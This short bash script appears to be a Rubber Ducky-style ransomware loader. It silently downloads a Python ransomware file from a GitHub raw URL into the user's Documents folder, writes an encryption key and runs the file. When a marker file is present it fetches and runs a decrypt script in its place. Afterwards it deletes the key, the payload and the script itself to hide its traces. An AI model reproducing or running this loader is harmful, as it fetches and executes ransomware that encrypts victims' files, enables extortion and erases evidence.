#!/bin/bash
curloc=`pwd`
targetPath=~/Documents/
source="https://raw.githubusercontent.com/MistyRavager/RubberDucky/main/ransomeware.py"
source2="https://raw.githubusercontent.com/MistyRavager/RubberDucky/main/decrypt.py"


cd $targetPath

if [[ ! -f ${targetPath}kludgefix ]]
then
    wget -q -o /dev/null $source
    if [ $? == 0 ]; then
        echo "${key}" | cat > key.key
        python3 ransomeware.py
        rm ./ransomeware.py
    fi
else  
    wget -q -o /dev/null $source2 
    if [ $? == 0 ]; then
        echo "${key}" | cat > key.key
        python3 decrypt.py
        rm ./decrypt.py
    fi   
fi

rm key.key 
cd $curloc
rm ./init_script.sh
